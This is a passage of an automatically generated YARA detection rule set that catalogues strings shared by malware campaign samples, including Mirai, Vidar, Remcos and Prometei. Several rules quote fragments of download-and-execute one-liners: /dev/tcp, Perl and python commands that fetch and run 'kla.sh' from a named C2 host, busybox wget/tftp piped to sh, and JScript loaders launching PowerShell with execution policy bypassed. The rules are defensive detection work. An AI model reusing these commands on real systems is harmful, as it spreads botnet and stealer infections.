        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-0ad9e3c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"10.0.0.0\" processorArchitecture=\"amd64\" name=\"Contoso.BackgroundUpdate\"" ascii
        $s1 = "      <supportedOS Id=\"{4f476546-937d-4f2f-b4bf-9f40a04d5b62}\"/>" ascii
        $s2 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s3 = "  <description>Background Update Service</description>" ascii
        $s4 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s5 = "Partial loss of significance (PLOSS)" ascii
        $s6 = "Total loss of significance (TLOSS)" ascii
        $s7 = "api-ms-win-crt-private-l1-1-0.dll" ascii
        $s8 = "Overflow range error (OVERFLOW)" ascii
        $s9 = "Argument domain error (DOMAIN)" ascii
        $s10 = "Argument singularity (SIGN)" ascii
        $s11 = "NtAllocateVirtualMemory" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11019884 and 12 of them
}

rule Sightlines_tlsh_58223311_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-58223311"
        date = "2026-10-24"
        campaign = "tlsh-58223311"
        family = "mirai"
        hash = "131479d9f3e5946bea46578ad2356ce60b507d406c844aa36f9470610a979354"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-58223311.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_5d3c973c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5d3c973c"
        date = "2026-10-24"
        campaign = "tlsh-5d3c973c"
        family = ""
        hash = "0a575410df7bb5c5d13aa46acdff196c566e748533c9b4be0d64af1213050a20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5d3c973c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "MsZCksRC5vcGVuKChbMTI2LCAxMjQsIDEwOV0ubWFwKHggPT4ge3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKHggXiA1Nyk7fS" ascii
        $s1 = "VuY3Rpb24gTihNLEkpe3JldHVybiBNPj4+SXxNPDwzMi1JfWNvbnN0IEQ9TWF0aC5wb3csZz1EKDIsMzIpLFQ9KFs4OSwgODAsID" ascii
        $s2 = "BjPU1hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnNsaWNlKDIsVCg1LDEwKSksZD1UKDAsMSk7Zy5zZWFyY2hQYXJhbXMuc2V0KG" ascii
        $s3 = "ExJiYoZVtNXT1uZXcgRnVuY3Rpb24oYXRvYihJKSkoKSl9fTs=\"))();const fqMaGkN7=globalThis.obChTK.hPL3On([119" ascii
        $s4 = "onst T=fqMaGkN7.Ot(R);T&&(R=new XMLHttpRequest,V=T+[69,31,71].map(V=>String.fromCharCode(122^V)).joi" ascii
        $s5 = "kxLCA4MiwgNjUsIDkzXS5tYXAoeCA9PiB7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoeCBeIDUzKTt9KS5qb2luKCIiKSk7bG" ascii
        $s6 = "1NfSxlVzRfX0g6ZnVuY3Rpb24oTSl7ZS5wPU19LGhQTDNPbjpjLFpLdkQwZTphc3luYyBmdW5jdGlvbihNKXtpZihNIGluIGU9PS" ascii
        $s7 = "Q8PCgzLWMpJTQqOH1mb3IoTFtMW1RdXT1iL2d8MCxMW0xbVF1dPWIsZD0wO2Q8TFtUXTspe2NvbnN0IE09TC5zbGljZShkLGQrPT" ascii
        $s8 = "V0IGMsZDtjb25zdCBMPVtdLGI9OCpNW1RdO2xldCBpPUlNLmg9SU0uaHx8W107Y29uc3QgeT1JTS5rPUlNLmt8fFtdO2xldCBDPX" ascii
        $s9 = "Y4MDYwNCk7Yys9TSlYW2NdPU07aVtDXT1EKE0sLjUpKmd8MCx5W0MrK109RChNLDEvMykqZ3wwfWZvcihNKz0igCI7TVtUXSU2NC" ascii
        $s10 = "01NjspTSs9IlwwIjtmb3IoYz0wO2M8TVtUXTtjKyspe2lmKGQ9TS5jaGFyQ29kZUF0KGMpLGQ+PjgpcmV0dXJuO0xbYz4+Ml18PW" ascii
        $s11 = "].map(V=>String.fromCharCode(45^V)).join(\"\")).zn.Nn.LJ1EuL?T=!0:globalThis.obChTK.hPL3On([75,78,76,7" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_706f9a8e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-706f9a8e"
        date = "2026-10-24"
        campaign = "tlsh-706f9a8e"
        family = ""
        hash = "016f12afc9832cebe3b0992e092141cd32468ada3b82f4c0c28f68011e460fb6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-706f9a8e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "for /f \"delims=\" %%A in ('powershell -NoProfile -Command \"(Invoke-WebRequest -Uri \\\"%GITHUB_VERSION_" ascii
        $s1 = "    call :PrintRed \"https://github.com/ValdikSS/GoodbyeDPI/issues/541#issuecomment-2661670982\"" ascii
        $s2 = "sc create %SRVCNAME% binPath= \"\\\"%BIN_PATH%winws.exe\\\" !ARGS!\" DisplayName= \"zapret\" start= auto" ascii
        $s3 = "URL%\\\" -Headers @{\\\"Cache-Control\\\"=\\\"no-cache\\\"} -UseBasicParsing -TimeoutSec 5).Content.Trim()\" 2^" ascii
        $s4 = "for /f \"delims=\" %%a in ('powershell -NoProfile -Command \"Get-ChildItem -Recurse -Path 'HKLM:System\\" ascii
        $s5 = "{ $_.DohFlags -gt 0 } | Measure-Object | Select-Object -ExpandProperty Count\"') do (" ascii
        $s6 = "for /f \"tokens=2*\" %%A in ('reg query \"HKLM\\System\\CurrentControlSet\\Services\\zapret\" /v zapret-disc" ascii
        $s7 = "reg add \"HKLM\\System\\CurrentControlSet\\Services\\zapret\" /v zapret-discord-youtube /t REG_SZ /d \"!fil" ascii
        $s8 = "    echo domain.example.abc>>\"%LISTS_PATH%list-general-user.txt\"" ascii
        $s9 = "    call :PrintYellow \"[?] VPN services found:!VPN_SERVICES!. Some VPNs can conflict with zapret\"" ascii
        $s10 = "    echo 203.0.113.113/32>\"%LISTS_PATH%ipset-exclude-user.txt\"" ascii
        $s11 = "    echo domain.example.abc>\"%LISTS_PATH%list-exclude-user.txt\"" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_7e34bbdb_vidar
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7e34bbdb"
        date = "2026-10-24"
        campaign = "imphash-7e34bbdb"
        family = "vidar"
        hash = "21eacb925392e39b86b7a04262cdc4f9f55a21e4ae308cebf7e4d7d95e44699a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7e34bbdb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s1 = "SELECT 'CREATE TABLE vacuum_db.' || substr(sql,14)   FROM sqlite_master WHERE type='table' AND name!" ascii
        $s2 = "OH163IV7RP72254RVEFJG7NCM4RPV0Y83BMS2DVGFFPWKWA1NTG2Y3NR4YU81GL11890SMZST9EBR02Z4ZBBU6KAY5XDTXO83Y4L" ascii
        $s3 = "SELECT 'CREATE UNIQUE INDEX vacuum_db.' || substr(sql,21)   FROM sqlite_master WHERE sql LIKE 'CREAT" ascii
        $s4 = "CB530H1UO79CYM5THLYPSOVEWRUA3RITI4RNZFUKDEC5VDQQZBMX78AYQ0HJX017ZP" ascii
        $s5 = "SELECT 'DELETE FROM vacuum_db.' || quote(name) || ';' FROM vacuum_db.sqlite_master WHERE name='sqlit" ascii
        $s6 = "SELECT 'CREATE INDEX vacuum_db.' || substr(sql,14)  FROM sqlite_master WHERE sql LIKE 'CREATE INDEX " ascii
        $s7 = "MIH6SJCKVV71GJAGNEYM0R4UYHQ71XKTSN71443UZY859PZF3KQPW8R4O" ascii
        $s8 = "1EZNAJRI2KACTFKAEIDGCS26QKQ5VFBMW7YO2F8OO9749KJ08X0535ZJM27Z3WXWJXPWR5I9JY" ascii
        $s9 = "autoindex%%' AND type='index' THEN 'sqlite_autoindex_' || %Q || substr(name,%d+18) ELSE name END WHE" ascii
        $s10 = "5BWLFU17VE5ZVMMYT7T8ORK4NMAOVJ53JHMG6FAEGLRUMJKP7TBOTR7N1282UMLMJBPN9F1O7O1D9ZSEBUQCHQJ2K9PEHHU4AFLK" ascii
        $s11 = "UPDATE %Q.%s SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q WHERE rowid=#%d" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2416640 and 12 of them
}

rule Sightlines_tlsh_578f9cdd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-578f9cdd"
        date = "2026-10-24"
        campaign = "tlsh-578f9cdd"
        family = ""
        hash = "0753ccf32a410bfa46fa506d10d079eae4b912189b5256d417916f4dbec5ecc2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-578f9cdd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />" ascii
        $s1 = "    var shAds = new ActiveXObject(\"WScript.Shell\");" ascii
        $s2 = "    var shA = new ActiveXObject(\"WScript.Shell\");" ascii
        $s3 = "  try { window.moveTo(-32000, -32000); } catch (eh2) {}" ascii
        $s4 = "  var u = String(location.pathname || \"\");" ascii
        $s5 = "  try { u = decodeURIComponent(u); } catch (e0) {}" ascii
        $s6 = "<script language=\"JScript\">" ascii
        $s7 = "  WINDOWSTATE=\"minimize\"" ascii
        $s8 = "  BORDERSTYLE=\"normal\"" ascii
        $s9 = "  SHOWINTASKBAR=\"yes\"" ascii
        $s10 = "  SINGLEINSTANCE=\"yes\"" ascii
        $s11 = "  MAXIMIZEBUTTON=\"no\"" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6fe7c653_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6fe7c653"
        date = "2026-10-24"
        campaign = "tlsh-6fe7c653"
        family = ""
        hash = "018d084a2b65856a2f7fe978c8d006a245f4fa55c189782e01675c6043774882"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6fe7c653.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "xN3t8aW1weQ4QYngYNVNyFW0JeRAKdGsRHFFaGxEJdwMpEyMHBwUGNnkTU10YCjINFzk+ODQZKVpQATQXDAs7ASILIydxaCckbQ4" ascii
        $s1 = "wZxQGcXExN3t8aW1weQ4QYngYMFMAD3xvOSMzfSsQHy9TKhIATBUIFCgILB4YORxwU2MTAWcNESUcBSRyMnNOcAsLdgRxBDcteyZ" ascii
        $s2 = "UVSokG3UkGw80BAcTY1UjLhA0MHN8Bi4sdXJ9ES80DRFxPC0wCQNbbgosBAMALRIiISAcYWsoCR10Jg0bURcHFglNDBNuMB4SeBU" ascii
        $s3 = "    var PAYLOAD_B64   = \"AAMuIjE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRRwZxQGcXE" ascii
        $s4 = "6IgAjDygsUncDKRN9AhV4WDMfdQBpFHBnFAZxcTE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRR" ascii
        $s5 = "    // STAGE 3: XOR (equivalent to XorDecryptor.decrypt)" ascii
        $s6 = "    // STAGE 9: top-level workflow (equivalent to WorkflowOrchestrator)" ascii
        $s7 = "                \"SELECT * FROM Win32_Process WHERE Name='powershell.exe' OR Name='pwsh.exe'\"" ascii
        $s8 = "    function runPowerShellAndWait(shell, fs, scriptPath) {" ascii
        $s9 = "            var doc = makeActiveX(\"MSXML2.DOMDocument.6.0\");" ascii
        $s10 = "        var innerB64 = xorDecode(xorCipher, XOR_KEY);" ascii
        $s11 = "    function killPowerShellByPath(scriptPath) {" ascii
    condition:
        filesize < 5507914 and 12 of them
}

rule Sightlines_tlsh_3685058e_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3685058e"
        date = "2026-10-24"
        campaign = "tlsh-3685058e"
        family = "remcos"
        hash = "3f7089c857d85f2e3f7d9d2f5788649e4e3520d3fd575000b1d1e8db9022c263"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3685058e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "JweQ4XalsYNVMFAl97JxUYDj03ejcJLxl8WgkFJjUDNRoNACIAQn8FODYmDTQxOzQaJmRhdS4/FG8ODDAMIQh1dycRMwUgOBw4Uw" ascii
        $s1 = "80UyMDemIJcRAqGBQSCCE8I3FwMCIwETYHADAtCCh7DxAUbnoKNnhYMx9xD2YUcGcTDlJxMTd7eGZicHkOF2pbGDVTchFiBnkQCn" ascii
        $s2 = "        PAYLOAD: \"BwsNIjE3e3hmYnB5DhdqWxg1U3IRYgZ5EApzYzIcUVobFQYPEBRuego2eFgzH3EPZhRwZxMOUnExN3t4Zm" ascii
        $s3 = "ICBh0JBRgFDxt5JTIgDEBjBTQaFiABLy03fyZkBzAwPQAbFhgIIR8YBXwwIxYRGQAPWAkqNgZ9CTkfJBMnJBQHDBdYVS0sbiYODS" ascii
        $s4 = "            var innerBase64 = Crypto.xorDecrypt(xorEncrypted, Config.XOR_KEY);" ascii
        $s5 = "    WScript.Quit(WorkflowOrchestrator.execute() ? 0 : 1);" ascii
        $s6 = "            var xmlDoc = ComFactory.create(\"MSXML2.DOMDocument.6.0\");" ascii
        $s7 = "            var scriptContent = PayloadPipeline.preprocess(Config.PAYLOAD);" ascii
        $s8 = "// Alternative Workflow Processor - Object-Oriented Variant" ascii
        $s9 = "                FileDeployer.ensureDirectory(fs, Config.WORK_DIR);" ascii
        $s10 = "            var fileName = prefix + TextProcessor.randomToken() + \".ps1\";" ascii
        $s11 = "            var cmd = \"powershell.exe -ExecutionPolicy Bypass -NoProfile \"" ascii
    condition:
        filesize < 2179026 and 12 of them
}

rule Sightlines_tlsh_c41ce9ce_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c41ce9ce"
        date = "2026-10-24"
        campaign = "tlsh-c41ce9ce"
        family = ""
        hash = "30d708ca4e2a3dde71855741fd40c581c5a639817798fecffbbd81bb4be3fe39"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c41ce9ce.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "return DateKit.padTwo(when.getHours()) + \":\" + DateKit.padTwo(when.getMinutes());" ascii
        $s1 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s2 = "var b = DateKit.startOfDay(second).getTime();" ascii
        $s3 = "NumKit.buildRange = function (start, stop, step) {" ascii
        $s4 = "MoveNext: function () { i++; return i < self.Inner.length; }," ascii
        $s5 = "NumKit.percentOf = function (part, whole) {" ascii
        $s6 = "var childAttribute = new LxKit.Element();" ascii
        $s7 = "NumKit.clamp = function (value, low, high) {" ascii
        $s8 = "var ImportRecursionMode = { Stubs: \"Stubs\", Recursive: \"Recursive\" };" ascii
        $s9 = "var normalized = text.split(\"\\r\\n\").join(\"\\n\");" ascii
        $s10 = "NumKit.roundTo = function (value, digits) {" ascii
        $s11 = "elem = this.Inner[index] = elem.Owner.OnStubRequest(elem.ID);" ascii
    condition:
        filesize < 3025282 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_4b30d7e5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-4b30d7e5"
        date = "2026-10-24"
        campaign = "dotnet_typelib_guid-4b30d7e5"
        family = ""
        hash = "1e533b6f4417c95761a96e060e12eef541fa3dd9a8c5b3888b86e99666266399"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-4b30d7e5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Campanae Hung Dead | Clappers Drawn by Wires | Baton Clavier | Louvres Open" wide
        $s4 = "Acta relatio prospere exportata sunt secundum CarillonSchema.xsd!" wide
        $s5 = "<CarillonneurBatonAngulus>k__BackingField" ascii
        $s6 = "Nexus Linkage Vitia (Slack Defectus): 0" wide
        $s7 = "Notae Purae: {0}  |  Dynamica Vitiosa: {1}" wide
        $s8 = "Choralis Sancti Rombout (Toccata Carillonis)" wide
        $s9 = "Campanarum harmonia fideliter servata est. Transmissionis nexus recte se habent nec ullae magnae cla" wide
        $s10 = "http://tempuri.org/CarillonSchema.xsd" wide
        $s11 = "<CarillonneurBrachiumY>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7351296 and 12 of them
}

rule Sightlines_c2_633ff631_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-633ff631"
        date = "2026-10-24"
        campaign = "c2-633ff631"
        family = "mirai"
        hash = "0c1cf43713eb87341ea3a99d17605243285502255d31e074787d72531b788c41"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-633ff631.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3596144 and 12 of them
}

rule Sightlines_contacted_5175357c_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-5175357c"
        date = "2026-10-24"
        campaign = "contacted-5175357c"
        family = "prometei"
        hash = "0a16883a25d4d859ad2907f68981cd4c480d9bb27c2511de90e3d372162e5729"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-5175357c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "403 ForbH" ascii
        $s1 = "updatechH" ascii
        $s2 = "\"ZzY8<{j" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2577750 and 3 of them
}

rule Sightlines_imphash_ad2c579a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-ad2c579a"
        date = "2026-10-24"
        campaign = "imphash-ad2c579a"
        family = ""
        hash = "2cd3f398007642bba90bfa972b3587e75b6729a5b3c6efdaf8bde818c62db194"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-ad2c579a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\SystemRoot\\System32\\" wide
        $s1 = "FileUtility.exe" wide
        $s2 = "t9fD98u3HcH<" ascii
        $s3 = ".FDGS5$Yfll" ascii
        $s4 = "File Utility" wide
        $s5 = "=jcu.^^env" ascii
        $s6 = "0Lo4BJ.}E" ascii
        $s7 = "ZDcQ$Ib}m" ascii
        $s8 = "r8,^e7thc" ascii
        $s9 = "/yB|Rdt8" ascii
        $s10 = "mS8>BQdR" ascii
        $s11 = "p\\h6[^Z0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2885504 and 9 of them
}

rule Sightlines_tlsh_a0e6fea8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a0e6fea8"
        date = "2026-10-23"
        campaign = "tlsh-a0e6fea8"
        family = "mirai"
        hash = "22fc6d79d77e513db7ec7f95fc27aed76a67779955109e0a17dd54f9a7b3ea8e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a0e6fea8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Required key not available" ascii
        $s1 = "Key was rejected by service" ascii
        $s2 = "__vdso_clock_gettime64" ascii
        $s3 = "Key has been revoked" ascii
        $s4 = "Key has expired" ascii
        $s5 = ".relro_padding" ascii
        $s6 = "Restart=always" ascii
        $s7 = "/proc/%d/stat" ascii
        $s8 = "ExecStart=%s" ascii
        $s9 = "/bin/busybox" ascii
        $s10 = "/proc/%d/exe" ascii
        $s11 = "Type=simple" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_77fef818_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-77fef818"
        date = "2026-10-24"
        campaign = "tlsh-77fef818"
        family = ""
        hash = "21b26e4435c0c6d8212ed91a5e70c13710d41faf912474d2d17ef21fa13ab361"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-77fef818.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "if ([System.Environment]::Is64BitProcess)" ascii
        $s1 = "[System.IO.Pipes.PipeOptions]::None);" ascii
        $s2 = "[Parameter( Position = 1 )]" ascii
        $s3 = "[Parameter( Position = 0)]" ascii
        $s4 = "[OutputType([Type])]" ascii
        $s5 = "return $false;" ascii
        $s6 = "return $null;" ascii
        $s7 = "} finally {" ascii
        $s8 = "    return" ascii
        $s9 = "catch {}" ascii
    condition:
        filesize < 1274118 and 10 of them
}

rule Sightlines_tlsh_07ae73b1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-07ae73b1"
        date = "2026-10-24"
        campaign = "tlsh-07ae73b1"
        family = ""
        hash = "477b83feba08216cd52e6d16b15732e49ca5557e2648c1427dd12e9f4eba60cd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-07ae73b1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\K]6D3]4$T]^$DGD$DA3JO=*B4P&;7;1/proc/self/exe" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" ascii
        $s3 = "ULT-STY-te k2-bynd 3expa0001" ascii
        $s4 = "upgrade-insecure-requests" ascii
        $s5 = "Connection: keep-alive" ascii
        $s6 = "sec-ch-ua-platform" ascii
        $s7 = "gzip, deflate, br" ascii
        $s8 = "/proc/self/status" ascii
        $s9 = "sec-ch-ua-mobile" ascii
        $s10 = "GET %s HTTP/1.1" ascii
        $s11 = "en-US,en;q=0.9" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_626f9c98_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-626f9c98"
        date = "2026-10-24"
        campaign = "tlsh-626f9c98"
        family = "mirai"
        hash = "0d1f3ea519338a5254c15e409176e54f7f0820bc3da8259eb91cf2306d6df79a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-626f9c98.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3305488 and 12 of them
}

rule Sightlines_tlsh_36693cce_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-36693cce"
        date = "2026-10-24"
        campaign = "tlsh-36693cce"
        family = "mirai"
        hash = "0c1cf43713eb87341ea3a99d17605243285502255d31e074787d72531b788c41"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-36693cce.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3305488 and 12 of them
}

rule Sightlines_tlsh_bb842806_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bb842806"
        date = "2026-10-24"
        campaign = "tlsh-bb842806"
        family = "mirai"
